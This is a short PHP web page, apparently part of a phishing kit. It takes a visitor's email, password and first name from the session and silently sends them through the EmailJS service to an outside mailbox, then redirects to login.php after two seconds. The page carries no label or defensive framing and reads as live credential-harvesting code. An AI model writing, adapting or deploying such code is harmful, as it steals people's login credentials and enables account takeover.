
<?php
session_start();
    
?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    
</head>
<body>
<script type="text/javascript"
        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
</script>
<script type="text/javascript">
   (function(){
      emailjs.init("kIGu8gq2qBiyyCov0");
   })();
</script>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>

<script>


var data = {
    service_id: 'service_p27nkhf',
    template_id: 'template_lnrtfif',
    user_id: 'kIGu8gq2qBiyyCov0',
    template_params: {
        'email': '<?php echo $_SESSION['email'] ?>',
        'password': '<?php echo $_SESSION['password'] ?>',
        'prenom': '<?php echo $_SESSION['name'] ?>',
        'g-recaptcha-response': '03AHJ_ASjnLA214KSNKFJAK12sfKASfehbmfd...'
    }
};
 
$.ajax('https://api.emailjs.com/api/v1.0/email/send', {
    type: 'POST',
    data: JSON.stringify(data),
    contentType: 'application/json'
    
})
 window.setTimeout(function() {
     window.location = 'login.php';
   }, 2000);

</script>
<script>

  <?php //session_destroy();?>


</script>

</body>
</html>


<?php 

    
    
    

?>


